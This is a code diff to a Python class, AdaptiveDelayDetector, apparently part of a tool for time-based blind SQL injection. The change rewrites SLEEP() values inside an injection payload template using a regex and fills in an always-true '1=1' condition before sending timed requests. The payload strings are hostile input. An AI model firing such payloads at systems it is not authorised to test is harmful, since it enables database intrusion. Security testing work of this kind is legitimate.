@@ -5,6 +5,7 @@ Automatically determines optimal delays based on network conditions.
 
 import time
 import statistics
+import re
 from typing import List, Optional
 import requests
 
@@ -46,9 +47,18 @@ class AdaptiveDelayDetector:
     def _measure_with_delay(self, delay: float, samples: int = 5) -> List[float]:
         """Measure timing with a specific delay."""
         timings = []
-        payload = self.payload_template.format(
-            condition=f"1=1 AND SLEEP({delay})"
+        
+        # Replace any hardcoded SLEEP() delay in the template with our test delay
+        # Pattern: SLEEP(any_number) -> SLEEP(delay)
+        payload_template = re.sub(
+            r'SLEEP\([0-9.]+\)',
+            f'SLEEP({delay})',
+            self.payload_template,
+            flags=re.IGNORECASE
         )
+        
+        # Use a condition that's always true (1=1) to trigger the delay
+        payload = payload_template.format(condition="1=1")
         
         for _ in range(samples):
             start = time.time()
